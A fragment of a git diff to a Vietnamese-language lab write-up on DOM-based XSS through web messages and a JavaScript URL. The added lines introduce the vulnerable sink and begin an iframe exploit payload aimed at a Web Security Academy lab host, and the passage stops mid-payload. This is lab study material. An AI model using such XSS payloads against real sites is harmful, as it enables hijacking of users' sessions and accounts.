@@ -297,8 +297,11 @@ Waiting a few minute we see request to BurpCollaborator
 
 ### DOM XSS using web messages and a JavaScript URL
 ![alt text](image-27.png)
+
 Trên đây là sink dẫn đến xss 
+
 Payload sẽ như sau :
+
 ```code
 <iframe 
     src="https://0ab700ba04713c16807244160075000e.web-security-academy.net/" 
